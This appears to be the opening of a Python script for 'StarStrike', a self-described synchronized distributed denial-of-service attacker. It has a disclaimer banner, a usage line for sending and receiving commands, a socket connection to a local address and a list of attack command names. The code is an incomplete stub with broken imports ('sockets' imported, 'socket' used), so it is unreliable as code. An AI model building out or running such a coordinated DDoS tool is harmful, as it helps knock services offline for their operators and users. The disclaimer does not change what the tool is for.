##############################################################
#                    StarStrike SDDOSA                       #
##############################################################
#                       !WARNING!                            #
#                                                            #
#    Malicious use of this tool without permission is        #
#      illegal and may result in imprisonment.               #
#   Only use this tool with permission from the victim.      #
#   The creator of this tool will not take accountability    #
#     for the damages it may do, as it is the user's fault.  #
#                                                            #
#        This tool is not associated with NetStrike.         #
##############################################################
#                      made by solez                         #
##############################################################

#you must have this script and starstrike installed for it to work

print("StarStrike Synchronized Distributed Denial Of Service Attacker:\n-r to recieve commands\n-s to send commands")

import starstrike
import sockets
import json
import sys

#connect to network
socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect(("192.168.0.1", 3703))

#commands
commands = ["begincmd", "prepare", "start", "stop"]





